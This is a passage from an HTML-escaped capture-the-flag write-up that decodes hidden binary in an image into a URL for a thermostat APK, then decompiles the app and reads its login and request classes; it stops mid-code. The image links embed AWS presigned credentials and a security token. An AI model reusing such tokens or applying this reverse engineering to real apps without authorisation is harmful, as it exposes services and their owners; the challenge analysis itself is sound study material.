inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eMy first thought was try to decode the binary on image’s background. I also noted that after the ‘_’ character the binary numbers were repeating the same sequence, which was:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e01111010 01101100 01101001 01100010 00101011 01111000 10011100 01001011 11001010 00101100 11010001 01001011 11001001 11010111 11001111 00110000 00101100 11001001 01001000 00101101 11001010 00000101 00000000 00100101 11010010 00000101 00101001\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eSo let’s see if this lead to any ascii word or something readable:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003ebin_array_image\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;0b01111010\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b01101100\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b01101001\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b01100010\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b00101011\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b01111000\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b10011100\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b01001011\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b11001010\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b00101100\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b11010001\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b01001011\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b11001001\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b11010111\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b11001111\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b00110000\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b00101100\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b11001001\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b01001000\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b00101101\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b11001010\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b00000101\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b00000000\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b00100101\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b11010010\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b00000101\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0b00101001\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003ebin_array_image\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003ezlib\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003eK\u003c/span\u003e\u003cspan class=\"err\"\u003eÊ\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"err\"\u003eÑ\u003c/span\u003e\u003cspan class=\"n\"\u003eK\u003c/span\u003e\u003cspan class=\"err\"\u003eÉ×Ï\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"err\"\u003eÉ\u003c/span\u003e\u003cspan class=\"n\"\u003eH\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"err\"\u003eÊ\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e\u003cspan class=\"err\"\u003eÒ\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNice, the first five chars are: \u003ccode\u003ezlib+\u003c/code\u003e. So, maybe we should use zlib to decompress the remaining bytes.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ezlib\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003ebyte_string\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003ebytes\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"nb\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003ebin_array_image\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e:])\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ezlib\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecompress\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ebyte_string\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;bit.do/h1therm\u0026#39;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOk. Now we have an URL that redirects to an APK file in Google Drive. Let\u0026#39;s download it.\u003c/p\u003e\n\n\u003ch2 id=\"apk\"\u003eAPK\u003c/h2\u003e\n\n\u003cp\u003eAs my first step, I used JADX [3] to decompile the app and start to inspect the code:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"jadx.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/367/b56603cd847c84d97f7ea294650644ab85a65953/jadx.png?response-content-disposition=attachment%3B%20filename%3D%22jadx.png%22%3B%20filename%2A%3DUTF-8%27%27jadx.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=26468cfa7b5ebf7eceb11679a9253dd81a1a200d94948361f6e8dfd1a5963a67\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/367/b56603cd847c84d97f7ea294650644ab85a65953/jadx.png?response-content-disposition=attachment%3B%20filename%3D%22jadx.png%22%3B%20filename%2A%3DUTF-8%27%27jadx.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=26468cfa7b5ebf7eceb11679a9253dd81a1a200d94948361f6e8dfd1a5963a67\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eReading AndroidManifest.xml I could identify two activity classes: \u003ccode\u003ecom.hackerone.thermostat.LoginActivity\u003c/code\u003e and \u003ccode\u003ecom.hackerone.thermostat.ThermostatActivity\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch3 id=\"loginactivity-class\"\u003eLoginActivity.class\u003c/h3\u003e\n\n\u003cp\u003eThe core functionality of LoginActivity is to authenticate the user:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eattemptLogin\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eVolley\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003enewRequestQueue\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003eadd\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eListener\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"nc\"\u003eLoginActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eloginSuccess\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eLoginActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eshowProgress\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eLoginActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emPasswordView\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetError\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eLoginActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emPasswordView\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003erequestFocus\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}));\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn \u003ccode\u003eattemptLogin\u003c/code\u003e the App builds a json object like this: \u003ccode\u003e{\u0026quot;username\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;password\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;cmd\u0026quot;: \u0026quot;getTemp\u0026quot;}\u003c/code\u003e and then instantiates a  \u003ccode\u003ePayloadRequest\u003c/code\u003e object which will be added to a Volley Queue to be processed. So let\u0026#39;s see what does this class do.\u003c/p\u003e\n\n\u003ch3 id=\"payloadrequest-class\"\u003ePayloadRequest.class\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e \u003cspan class=\"kd\"\u003eextends\u003c/span\u003e \u003cspan class=\"nc\"\u003eRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n     \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"nf\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eListener\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003elistener\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003esuper\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;http://35.243.186.41/\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eErrorListener\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonErrorResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eVolleyError\u003c/span\u003e \u003cspan class=\"n\"\u003evolleyError\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"n\"\u003elistener\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eonResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Connection failed\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emListener\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003elistener\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emParams\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;d\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebuildPayload\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFrom here we could note an URL \u003ccode\u003ehttp://35.243.186.41/\u003c/code\u003e which probably is being used as the backend server. Also, there is a method called \u003ccode\u003ebuildPayload\u003c/code\u003e which will be the value for \u003ccode\u003ed\u003c/code\u003e parameter.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003ebuildPayload\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan 